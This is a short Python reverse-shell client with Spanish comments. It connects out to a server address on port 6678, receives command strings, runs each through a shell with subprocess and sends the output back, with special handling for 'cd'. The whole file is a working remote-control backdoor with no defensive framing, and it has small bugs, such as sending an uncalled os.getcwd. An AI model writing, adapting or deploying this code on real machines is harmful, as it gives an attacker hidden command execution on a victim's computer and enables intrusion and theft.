#libreria necesaria
import socket
import os
import subprocess

def shell(client):
    current_dir = os.getcwd()
    client.send(current_dir.encode('utf-8'))
    while True:  
        res = client.recv(3000)
        if res.decode('utf-8').find("cd") == 0 and len(res.decode('utf-8')) > 2:
            os.chdir(res.decode('utf-8')[3:])
            result = os.getcwd()
            client.send(result.encode('utf-8'))  
            print("res", res.decode('utf-8'))
            
            
        else:
            proc = subprocess.Popen(res.decode('utf-8'), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            
            result = proc.stdout.read()+ proc.stderr.read()
            print("result",result)
            ruta = os.getcwd
            if len(res)== 0:
                client.send(ruta)
                
            else:
                client.send(result)

def start_client():
    #se coloca la misma ip que se coloco en el server
    ip = ""
    #tambien el mismo puerto
    port = 6678
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    print("Conexión establecida con el servidor")
    
    shell(client)  
    
    client.close()

start_client()
